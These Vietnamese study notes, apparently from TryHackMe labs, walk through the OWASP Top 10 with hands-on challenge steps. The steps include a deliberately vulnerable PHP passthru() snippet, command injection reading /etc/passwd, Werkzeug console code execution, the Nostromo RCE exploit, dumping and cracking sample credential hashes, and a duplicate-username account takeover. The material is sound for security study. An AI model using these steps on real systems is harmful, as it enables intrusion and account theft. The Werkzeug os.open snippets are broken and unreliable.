# OWASP Top 10 - 2021

1. ***Broken Access Control***

2. ***Cryptographic Failures***

3. ***Injection***

4. ***Insecure Design***

5. ***Security Misconfiguration***

6. ***Vulnerable and Outdated Components***

7. ***Identification and Authentication Failures***

8. ***Software and Data Integrity Failures***

9. ***Security Logging & Monitoring Failures***

10. ***Server-side Request Forgery (SSRF)***

***1. Broken Access Control***

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image.png?raw=true)

Nếu user có thể truy cập tài nguyên dành cho admin thì chức năng kiểm soát truy cập đã bị lỗi. 

=> Có khả năng xem được thông tin nhạy cảm của user khác.

=> Truy cập chức năng trái phép

=> ***Broken Access Control*** dẫn đến ***bỏ qua việc ủy quyền***, cho phép ***xem dữ liệu nhạy cảm*** hoặc ***thực hiện tác vụ không được phép***.

***Broken Access Control (IDOR Challenge)***

***IDOR*** hoặc ***Insecure Direct Object Reference*** (Tham chiếu đối tượng trực tiếp không an toàn), xảy ra khi ứng dụng web cho phép user ***truy cập trực tiếp*** vào tài nguyên (như file, dữ liệu user, tài khoản ngân hàng,...) mà không kiểm tra quyền truy cập. Lỗ hổng thường xảy ra khi lập trình viên sử dụng các ***tham chiếu trực tiếp*** (ví dụ: ID, tên file) để truy cập đối tượng trên server mà không xác minh xem user có quyền truy cập hay không. 

Tham chiếu trực tiếp là sao? Là khi sử dụng các giá trị cụ thể (như ID, tên file,...) để truy cập trực tiếp vào 1 đối tượng trên server. 

VD: trong URL https://example.com/profile?id=123, giá trị ***id=123*** là một tham chiếu trực tiếp đến hồ sơ có ID là 123. 

Giả sử khi đang login vào bank account, sau khi xác thực thành công, được đưa đến URL https://bank.thm/account?id=111111: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image1.png?raw=true)

Tuy nhiên, có 1 vấn đề rất lớn ở đây, ***bất kỳ ai*** cũng có thể thay đổi thông số ***id*** thành thông số khác như 222222 và nếu website được định cấu hình không chính xác, anh ta sẽ có quyền truy cập vào thông tin bank của user có id là 222222.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image2.png?raw=true)

=> Vì ứng dụng web không kiểm tra user đã login có sở hữu account được tham chiếu hay không nên attacker có thể lấy thông tin nhạy cảm từ user khác do lỗ hổng IDOR.

***Lưu ý***, các tham chiếu đối tượng trực tiếp không phải vấn đề mà là ứng dụng web không xác thực xem ***user đã login có quyền truy cập vào account được request hay không***.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image3.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image4.png?raw=true)

***2. Cryptographic Failures***

Cryptographic Failure đề cập đến bất kỳ lỗ hổng nào phát sinh từ việc sử dụng sai (hoặc không sử dụng) thuật toán mã hóa để bảo vệ thông tin nhạy cảm. 

Lấy ví dụ, 1 ứng dụng email an toàn: 

- Khi truy cập email account của mình bằng browser và muốn chắc chắn rằng thông tin liên lạc giữa mình và server được mã hóa. Bằng cách đó, bất kỳ kẻ nghe trộm nào cố gắng ***nắm bắt các gói tin mạng*** sẽ không thể khôi phục nội dung email. 

- Vì email được lưu trữ trong 1 số server do nhà cung cấp quản lý nên nhà cung cấp email không thể đọc email của khách hàng. Vì mục đích này, email cũng có thể được mã hóa khi được lưu trữ trên server.

Cryptographic Failure thường khiến ứng dụng web vô tình tiết lộ sensitive data.

Ở cấp độ phức tạp hơn, việc lợi dụng Cryptographic failure liên quan đến các kỹ thuật như ***“Man in the Middle Attacks”***, theo đó attacker buộc user kết nối thông qua thiết bị mà chúng kiểm soát. Sau đó, chúng sẽ lợi dụng điểm yếu mã hóa trên bất kỳ data nào được truyền đi để truy cập thông tin bị chặn. Trong 1 số trường hợp, data nhạy cảm có thể được tìm thấy trực tiếp trên chính web server.

***Cryptographic Failures (Supporting Material 1)***

Cách phổ biến nhất để lưu trữ 1 lượng lớn data ở định dạng có thể truy cập dễ dàng từ nhiều vị trí là trong ***Database***. Các công cụ Database thường tuân theo cú pháp ***Structured Query Language*** (SQL) syntax.

Ngoài các server chuyên dụng, Database cũng có thể được lưu trữ dưới dạng file, gọi là ***flat-file Database***, lưu trữ dưới dạng 1 file duy nhất trên máy tính, dễ dàng hơn so với việc thiết lập toàn bộ Database server. 

=> Điều gì sẽ xảy ra nếu ***Flat-file DB*** được lưu trữ dưới thư mục root của website? (tức là 1 trong các file mà user có thể truy cập khi kết nối website). Như vậy, có thể tải xuống và truy vấn, với ***toàn quyền truy cập vào Database***.

Định dạng phổ biến nhất (và đơn giản nhất ) của Flat-file DB là ***SQLite database***.

Máy khách này được gọi là ***sqlite3*** và được cài đặt mặc định trên nhiều bản phân phối Linux.

Giả sử đã quản lý thành công việc tải xuống db: 

    user@linux$ ls -l 
    -rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db
                                                                                                                                                        
    user@linux$ file example.db 
    example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1

=> File ***example.db*** là 1 ***SQLite database***, để truy cập sử dụng lệnh ***sqlite3 < db-name >***:

    user@linux$ sqlite3 example.db                     
    SQLite version 3.39.2 2022-07-21 15:24:47
    Enter ".help" for usage hints.
    sqlite>

Từ đây, có thể xem các bảng trong Database bằng cách dùng lệnh ***.tables***:

    user@linux$ sqlite3 example.db                     
    SQLite version 3.39.2 2022-07-21 15:24:47
    Enter ".help" for usage hints.
    sqlite> .tables
    customers

Tại thời điểm này, ta có thể ***kết xuất tất cả dữ liệu*** khỏi bảng. 

sử dụng ***PRAGMA table_info(customers)*** để xem thông tin các cột trong bảng customers. Sau đó sử dụng ***SELECT * FROM customers*** để lấy thông tin bảng: 

    sqlite> PRAGMA table_info(customers);
    0|cudtID|INT|1||1
    1|custName|TEXT|1||0
    2|creditCard|TEXT|0||0
    3|password|TEXT|1||0

    sqlite> SELECT * FROM customers;
    0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
    1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
    2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
    3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70
    4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679
    5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f

Có thể thấy từ thông tin bảng customers có 4 cột: custID, custName, creditCard và password. Xem xét hàng đầu tiên: 

    0|Joy Paulson|4916 9012 22317905|5f4dcc3b5aa765d61d8327deb882cf99

Ta có ***curtID=0***, ***custName=Joy Paulson***, ***creditCard=4916 9012 22317905*** và ***password=5f4dcc3b5aa765d61d8327deb882cf99*** (được mã hóa).

***Cryptographic Failures (Supporting Material 2)***

Sau khi thu thập thông tin, tìm thấy 1 tập hợp các hàm băm mật khẩu. 

sử dụng công cụ trực tuyến: ***Crackstation***, 1 công cụ cực tốt trong việc bẻ khóa password yếu. 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image5.png?raw=true)

Thử nhập hàm băm password của ***Joy Paulson***: 5f4dcc3b5aa765d61d8327deb882cf99 

Click “Crack Hashes”:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image6.png?raw=true)

=> Tìm được password của user ***Joy Paulson***. 

***Cryptographic Failures (Challenger)***

Truy cập web application: http://10.10.156.52:81/

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image7.png?raw=true)

Thử truy cập ***/assets***: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image8.png?raw=true)

=> Tìm được ***flat-file db***, tải xuống. 

Khám phá file: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image9.png?raw=true)

=> Tìm ra username và password của admin, thử login trên website: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image10.png?raw=true)

=> Login thành công vào tài khoản admin. 

***3.Injection***

Lỗi Injection phổ biến trong các ứng dụng web ngày nay. Những lỗi này xảy ra do ứng dụng diễn giải dữ liệu user input dưới dạng ***commands*** hoặc ***parameters***.

Một số ví dụ: 

- ***SQL Injection:*** Điều này xảy ra khi user input được chuyển tới các truy vấn SQL. Kết quả là attacker có thể chuyển các SQL query để thao túng kết quả của các truy vấn đó.

- ***Command Injection***: Xảy ra khi user input được chuyển tới system commands. Do đó, attacker có thể thực thi lệnh hệ thống tùy ý trên server.

Biện pháp bảo vệ chính để ngăn chặn Injection attacks đảm bảo rằng user input không được hiểu là ***query*** hoặc ***command***:

- ***Using an allow list***: khi input được gửi đến server, input này sẽ được so sánh với list input hoặc ký tự an toàn.

- ***Stripping input***: Nếu input chứa ký tự nguy hiểm, chúng sẽ bị loại bỏ trước khi xử lý.

Có nhiều thư viện giúp xây dựng allow list hoặc loại bỏ input data một cách tự động. 

***Command Injection***

Command Injection xảy ra khi ứng dụng web sử dụng các hàm (như trong PHP) để gọi lệnh hệ thống (command) trên server. Kẻ tấn công có thể lợi dụng lỗ hổng này để chèn và thực thi các lệnh hệ điều hành tùy ý trên server, như liệt kê file, đọc nội dung file nhạy cảm,...

Ví dụ tình huống: 

Công ty ***MooCorp*** muốn tạo ứng dụng web để hiển thị hình ảnh con bò (cow) bằng nghệ thuật ASCII với văn bản tùy chỉnh. 

Thay vì tự viết toàn bộ code để tạo ra nghệ thuật ASCII, họ quyết định sử dụng công cụ có sẵn trong Linux gọi là ***cowsay***. 

***cowsay*** là một lệnh trong Linux, khi chạy lệnh này với một đoạn văn bản, nó sẽ tạo ra một con bò ***ASCII*** "nói" đoạn văn bản đó. 

Họ viết 1 đoạn mã PHP đơn giản để gọi lệnh ***cowsay*** từ hệ thống và hiển thị kết quả lên website: 

    <?php
        if (isset($_GET["mooing"])) {
            $mooing = $_GET["mooing"];
            $cow = 'default';

            if(isset($_GET["cow"]))
                $cow = $_GET["cow"];
            
            passthru("perl /usr/bin/cowsay -f $cow $mooing");
        }
    ?>

- ***isset($_GET["mooing"])***: Kiểm tra xem user có gửi lên tham số ***mooing*** không (ví dụ: ***?mooing=Hello***).

- ***$mooing = $_GET["mooing"];***: Lấy giá trị của tham số mooing (ví dụ: Hello).

- ***$cow = 'default';***: Mặc định kiểu bò là default (con bò tiêu chuẩn).

- ***if(isset($_GET["cow"])) $cow = $_GET["cow"];***: Nếu người dùng gửi tham số cow (ví dụ: ***?cow=dragon***), sử dụng kiểu bò đó thay vì mặc định.

- ***passthru("perl /usr/bin/cowsay -f $cow $mooing");***: 

    - Gọi lệnh ***cowsay*** từ hệ thống:

        - ***-f $cow***: Chọn kiểu bò (ví dụ: dragon).

        - ***$mooing***: Văn bản mà bò sẽ "nói".
    
    - Hàm ***passthru*** thực thi lệnh hệ thống và hiển thị kết quả trực tiếp lên website.

=> Hoàn toàn có thể thao tác với các biến ***$cow*** và ***$mooing*** nên kẻ tấn công có thể chèn các lệnh bổ sung: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image11.png?raw=true)

***Exploiting Command Injection***

Sau khi biết cách ứng dụng hoạt động, vận dụng tính năng ***Inline Commands trong Bash***, là tính năng cho phép chạy một lệnh bên trong một lệnh khác. 

Cú pháp ***$(your_command_here)***. Khi Bash gặp cú pháp này, nó sẽ thực thi lệnh bên trong trước, sau đó sử dụng kết quả làm đầu vào cho lệnh bên ngoài.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image12.png?raw=true)

Quay trở lại Cowsay server, đây là điều sẽ xảy ra nếu  gửi inline command tới ứng dụng web: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image13.png?raw=true)

Một số lệnh có thể thử: *whoami, id, ifconfig/ip addr, uname -a, ps -ef,...*.

Truy cập http://10.10.156.52:82/ : 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image14.png?raw=true)

Thử chèn inline command ***ls***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image15.png?raw=true)

=> Tìm được file ***drepper.txt***. 

Thử chèn inline command ***cat /etc/passwd***: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image16.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image17.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image18.png?raw=true)

***4.Insecure Design***

Insecure Design là các lỗ hổng bảo mật xuất phát từ thiết kế ban đầu của ứng dụng, không phải do lỗi triển khai hoặc cấu hình. Nói cách khác, ý tưởng hoặc kiến trúc của ứng dụng đã có vấn đề ngay từ đầu, dẫn đến các lỗ hổng không thể khắc phục chỉ bằng cách sửa code.

=> Nguyên nhân:

- Thiếu mô hình mối đe dọa trong giai đoạn lập kế hoạch.

- Sử dụng "phím tắt" trong phát triển và quên loại bỏ chúng.

Ví dụ: 

- Tắt OTP trong phát triển và quên bật lại khi ứng dụng đi vào hoạt động.

***Insecure Password Resets***

1 ví dụ điển hình về lỗ hổng như vậy đã xảy ra trên Instagram. Instagram cho phép user đặt lại password đã quên bằng cách gửi cho họ mã gồm 6 chữ số tới số điện thoại qua SMS để xác thực. Nếu attacker muốn truy cập vào account của nạn nhân, chúng có thể cố gắng tấn công mã gồm 6 chữ số này. Đúng như dự đoán, điều này ko thực hiện được vì Instagram đã giới hạn tỷ lệ để sau 250 lần thử, user sẽ bị chặn thử thêm. 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image19.png?raw=true)

Tuy nhiên, nhận thấy rằng giới hạn này chỉ áp dụng cho những lần thử mã được phát hiện ***từ cùng 1 IP***. Nếu attacker có nhiều IP khác nhau để gửi request, giờ đây attacker có thể thử 250 mã cho mỗi IP. Dù attacker phải thử rất nhiều IP nhưng ***cloude services*** có thể khiến cuộc tấn công trở nên khả thi. 

=> Cách tiếp cận tốt nhất để tránh những lỗ hổng này là thực hiện ***mô hình hóa mối đe dọa*** ở giai đoạn đầu của vòng đời phát triển.

***Practical Example***

Truy cập http://10.10.156.52:85/

Nhập username là ***joseph***

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image21.png?raw=true)

=> Chọn câu hỏi ***What’s your favourite colour?*** (vì dễ đoán và phải thử ít lần nhất)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image22.png?raw=true)

Thử green: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image23.png?raw=true)

Truy cập vào account joseph và tìm thấy flag: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image24.png?raw=true)

***5.Security Misconfiguration***

Security Misconfiguration là lỗ hổng xảy ra khi hệ thống hoặc ứng dụng không được cấu hình bảo mật đúng cách, mặc dù các biện pháp bảo mật đã có sẵn. Khác với các lỗ hổng khác, vấn đề này không phải do lỗi code mà do cách thiết lập hệ thống.

=> Nguyên nhân phổ biến: 

- ***Cấu hình quyền truy cập kém:***

    - Ví dụ: Cấu hình sai quyền truy cập trên các dịch vụ đám mây như ***S3 buckets***, khiến dữ liệu nhạy cảm bị lộ.

- ***Bật các tính năng không cần thiết:***

    - Ví dụ: Kích hoạt các dịch vụ, trang web, tài khoản hoặc quyền hạn không cần dùng đến, tạo ra điểm yếu cho kẻ tấn công.

- ***Sử dụng mật khẩu mặc định***: 

    - Ví dụ: Không thay đổi mật khẩu mặc định của tài khoản, giúp kẻ tấn công dễ dàng đăng nhập.

- ***Thông báo lỗi quá chi tiết***: 

    - Ví dụ: Thông báo lỗi hiển thị quá nhiều thông tin, giúp kẻ tấn công hiểu rõ hơn về hệ thống.

- ***Không sử dụng HTTP security headers***:

    - Ví dụ: Thiếu các header bảo mật như Content-Security-Policy hoặc X-Content-Type-Options, làm tăng nguy cơ bị tấn công.

=> Hậu quả: 

- ***Rò rỉ dữ liệu nhạy cảm***: Kẻ tấn công có thể truy cập vào dữ liệu quan trọng.

- ***Khai thác lỗ hổng khác***: Ví dụ, sử dụng thông tin đăng nhập mặc định để thực hiện các cuộc tấn công như ***XXE*** (XML External Entities) hoặc ***Command Injection*** trên các trang quản trị.

***Debugging Interfaces***

Debugging Interfaces là các tính năng trong framework lập trình giúp developers gỡ lỗi ứng dụng trong quá trình phát triển. Nếu developers quên tắt các tính năng này trước khi đưa ứng dụng vào sử dụng, kẻ tấn công có thể lợi dụng chúng để thực thi mã độc. 

Ví dụ thực tế: 

- ***Vụ hack Patrenon (2015)***: 

    - Một nhà nghiên cứu bảo mật phát hiện giao diện gỡ lỗi của ***Werkzeug*** (một công cụ Python) vẫn mở trên ứng dụng.

    - Werkzeug cung cấp bảng điều khiển Python có thể truy cập qua URL ***/console*** hoặc hiển thị khi ứng dụng gặp lỗi.

    - Kẻ tấn công có thể sử dụng bảng điều khiển này để thực thi bất kỳ mã Python nào, dẫn đến việc kiểm soát hệ thống.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image25.png?raw=true)

***Practical example***

Truy cập http://10.10.156.52:86/

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image26.png?raw=true)

Truy cập endpoint ***/console*** và thử lệnh: 

    import os; print(os.open("ls -l").read()) 

Để thực thi lệnh ***ls -l*** trên server:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image27.png?raw=true)

=> Tìm được file ***app.py***. Tiếp tục thử lệnh để đọc nội dung file: 

    import os; print(os.open(“cat app.py”).read())

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image28.png?raw=true)

***6.Vulnerable and Outdated Components***

Khi kiểm tra bảo mật, có thể phát hiện một công ty đang sử dụng phần mềm hoặc thành phần có lỗ hổng đã được biết đến.

Ví dụ: Một công ty sử dụng ***WordPress*** phiên bản ***4.6***, trong khi phiên bản này có lỗ hổng ***RCE*** (Remote Code Execution) không cần xác thực.

=> Hậu quả: 

- Kẻ tấn công có thể dễ dàng khai thác lỗ hổng này mà không cần nhiều nỗ lực.

- Vì lỗ hổng đã được công khai, có khả năng cao là hệ thống đã bị tấn công trước đó.

=> Nguyên nhân: 

- Công ty không cập nhật phần mềm kịp thời, dẫn đến việc sử dụng các phiên bản lỗi thời và dễ bị tấn công.

***Vulnerable and Outdated Components - Exploit***

Xem xét 1 web application mẫu:  ***Nostromo 1.9.6***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image29.png?raw=true)

Đã có số phiên bản và tên phần mềm, có thể sử dụng ***Exploit-DB*** để thử và tìm cách khai thác cho phiên bản cụ thể này.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image30.png?raw=true)

Kết quả hàng đầu là tập lệnh khai thác từ xa. Tải xuống và thử thực thi mã:

    user@linux$ python 47837.py
    Traceback (most recent call last):
    File "47837.py", line 10, in <module>
        cve2019_16278.py
    NameError: name 'cve2019_16278' is not defined

Các khai thác tải xuống từ Internet có thể không hoạt động  trong lần đầu tiên. Khá nhiều tập lệnh trên ***Exploit-DB*** yêu cầu thực hiện sửa đổi.

Mở code và xem lỗi ở đâu: 

    # Exploit Title: nostromo 1.9.6 - Remote Code Execution
    # Date: 2019-12-31
    # Exploit Author: Kr0ff
    # Vendor Homepage:
    # Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
    # Version: 1.9.6
    # Tested on: Debian
    # CVE : CVE-2019-16278

    cve2019_16278.py  # This line needs to be commented.

    #!/usr/bin/env python

=> Tìm ra dòng đáng ra phải được ***comment***. 

Sửa xong và thực thi lại code: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image31.png?raw=true)

***Lưu ý***, hầu hết các tập lệnh sẽ cho biết cần cung cấp những đối số nào.

***Vulnerable and Outdated Components - Lab***

Truy cập http://10.10.156.52:84/

Thử search tên và phiên bản của website trên ***Exploit-DB***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image32.png?raw=true)

Tìm cách thực thi file exploit: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image33.png?raw=true)

=> Cần cung cấp URL mục tiêu.

Thực thi script với địa chỉ IP của website:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image34.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image35.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image36.png?raw=true)

***7.Identification and Authentication Failures***

***Authentication and Session Management***

***Authentication (Xác thực)***: Xác minh danh tính người dùng, thường qua username và password. 

***Session Management (Quản lý phiên)***: Sau khi xác thực thành công, server cung cấp Session Cookie để theo dõi người dùng, vì HTTP không có trạng thái.

=> Lỗ hổng phổ biến: 

- ***Brute-force attack***: Kẻ tấn công thử nhiều username và password để đoán thông tin đăng nhập.

- ***Weak credentials:*** Cho phép mật khẩu yếu (ví dụ: "password1") khiến kẻ tấn công dễ dàng đoán được.

- ***Weak Session Cookies:*** Session Cookie dễ đoán cho phép kẻ tấn công giả mạo phiên làm việc.

=> Giải pháp: 

- ***Chính sách mật khẩu mạnh***: Yêu cầu mật khẩu phức tạp để tránh bị đoán.

- ***Khóa tài khoản sau nhiều lần thử***: Ngăn chặn brute-force attack.

- ***Xác thực đa yếu tố (MFA)***: Yêu cầu thêm bước xác thực (ví dụ: mã OTP gửi đến điện thoại) để tăng cường bảo mật.

***Identification and Authentication Failures Practical***

Nhiều khi, những gì xảy ra là developers quên vệ sinh đầu vào (username và password) do user cung cấp trong code.

Ví dụ, giả sử 1 user có ***username=admin*** và attacker muốn truy cập vào account của họ, vậy những gì có thể làm là cố gắng đăng ký lại ***username*** đó nhưng có sửa đổi 1 chút. Attacker sẽ nhập ***“ admin”*** không có dấu ngoặc kép (chú ý khoảng trắng ở đầu). Bây giờ, khi nhập thông tin đó vào trường username và nhập các thông tin bắt buộc khác như id email hoặc password rồi gửi data đó, nó sẽ đăng ký 1 user mới! Nhưng user này sẽ có quyền giống như quản trị viên. User mới đó cũng có thể xem tất cả nội dung được trình bày dưới quyền quản trị viên.

Truy cập vào http://10.10.115.163:8088/

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image37.png?raw=true)

Thử đăng ký user mới với ***username=darren***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image38.png?raw=true)

=> Nhận thông báo lỗi: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image39.png?raw=true)

=> Thử đăng ký lại với username là ***“ darren”***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image40.png?raw=true)

=> Đăng ký thành công

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image41.png?raw=true)

=> Đăng nhập vào darren account: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image42.png?raw=true)

Làm tương tự với ***username=arthur***

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image43.png?raw=true)

***8.Software and Data Integrity Failures***

***Integrity (Tính toàn vẹn) là gì?***

Tính toàn vẹn đảm bảo rằng dữ liệu không bị thay đổi trái phép hoặc bị hỏng trong quá trình truyền tải hoặc lưu trữ.

Ví dụ: Khi tải xuống một file, cần chắc chắn rằng file đó không bị chỉnh sửa hoặc bị lỗi trong quá trình tải.

=> Cách kiểm tra tính toàn vẹn:

- ***Sử dụng hàm băm (Hash)***:

    - Hàm băm là một chuỗi số được tạo ra bằng cách áp dụng thuật toán (như MD5, SHA1, SHA256) lên dữ liệu.

    - Mỗi file có một giá trị băm duy nhất. Nếu file bị thay đổi, giá trị băm cũng thay đổi.

=> Ví dụ thực tế:

- ***WinSCP:***

    - Khi tải file từ trang chủ WinSCP, sẽ thấy giá trị băm (ví dụ: SHA256) được cung cấp cùng file.

    - Sau khi tải file, có thể tính toán lại giá trị băm của file đó và so sánh với giá trị băm được cung cấp.

    - Nếu hai giá trị khớp nhau, file vẫn nguyên vẹn. Nếu không, file có thể đã bị thay đổi hoặc hỏng.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image44.png?raw=true)

Để tính toán các giá trị băm khác nhau trong Linux, có thể dùng: 

    user@attackbox$ md5sum WinSCP-5.21.5-Setup.exe          
    20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe
                                                                                                                    
    user@attackbox$ sha1sum WinSCP-5.21.5-Setup.exe 
    c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe
                                                                                                                    
    user@attackbox$ sha256sum WinSCP-5.21.5-Setup.exe 
    e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe

Vì có cùng giá trị băm nên có thể kết luận rằng file đã tải xuống là bản sao chính xác của file trên website.

***Software and Data Integrity Failures***

Lỗ hổng này phát sinh từ ***code*** hoặc ***cơ sở hạ tầng*** sử dụng phần mềm hoặc data mà không sử dụng bất kỳ hình thức kiểm tra tính toàn vẹn nào. Vì không thực hiện xác minh tính toàn vẹn nên attacker có thể sửa đổi phần mềm hoặc data được truyền tới ứng dụng, dẫn đến hậu quả không mong muốn. Có 2 loại lỗ hổng phổ biến: 

- ***Software Integrity Failures***

- ***Data Integrity Failures***

***Software Integrity Failures***

- Khi một website sử dụng thư viện từ bên thứ ba (ví dụ: ***jQuery***) được lưu trữ trên server bên ngoài, nó có thể gặp rủi ro về tính toàn vẹn.

- Ví dụ: Nếu kẻ tấn công xâm nhập vào server chứa thư viện và thay đổi nội dung, mã độc có thể được chèn vào và thực thi trên trình duyệt của người dùng.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image45.png?raw=true)

=> Ví dụ về JQuery:

- Để sử dụng jQuery, có thể thêm dòng sau vào mã HTML: 

        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>

- Khi người dùng truy cập website, trình duyệt sẽ tải jQuery từ server bên ngoài.

=> Rủi ro: 

- Nếu kẻ tấn công thay đổi file jQuery trên server, mã độc sẽ được tải và thực thi trên trình duyệt của người dùng.

=> Giải pháp: ***Subresource Integrity (SRI)***:

- ***SRI*** là cơ chế bảo mật giúp đảm bảo tính toàn vẹn của thư viện bên ngoài.

- Bằng cách thêm hàm băm (ví dụ: SHA-256) vào thẻ ***< script >***, trình duyệt sẽ kiểm tra xem file tải về có khớp với hàm băm không. Nếu không khớp, file sẽ không được thực thi.

=> Cách sử dụng SRI:

- Thêm ***integrity*** và ***crossorigin*** vào thẻ ***< script >***:

        <script 
        src="https://code.jquery.com/jquery-3.6.1.min.js" 
        integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" 
        crossorigin="anonymous">
        </script>

- ***Hàm băm***: Đảm bảo file không bị thay đổi.

- ***Crossorigin***: Cho phép tải file từ nguồn bên ngoài.

***Data Integrity Failures***

Khi người dùng đăng nhập vào ứng dụng web, họ nhận được một ***Session Token*** (thường lưu trong cookie) để duy trì phiên làm việc.

=> Vấn đề: Nếu cookie chứa thông tin dễ bị giả mạo (ví dụ: username), kẻ tấn công có thể thay đổi giá trị và mạo danh người dùng khác.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image46.png?raw=true)

Ví dụ về lỗ hổng: 

- Giả sử ứng dụng webmail lưu username trong cookie.

- Kẻ tấn công có thể thay đổi giá trị username trong cookie để truy cập email của người khác.

- Đây là lỗi Data Integrity Failure vì ứng dụng tin tưởng vào dữ liệu mà người dùng có thể thay đổi.

=> Giải pháp: ***JSON Web Tokens (JWT)***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image47.png?raw=true)

- ***JWT*** là một loại token an toàn, gồm 3 phần:

    - ***Header***: Chứa thông tin về loại token và thuật toán mã hóa (ví dụ: HS256).

    - ***Payload***: Chứa dữ liệu (ví dụ: username).

    - ***Signature***: Dùng để xác minh tính toàn vẹn của token.

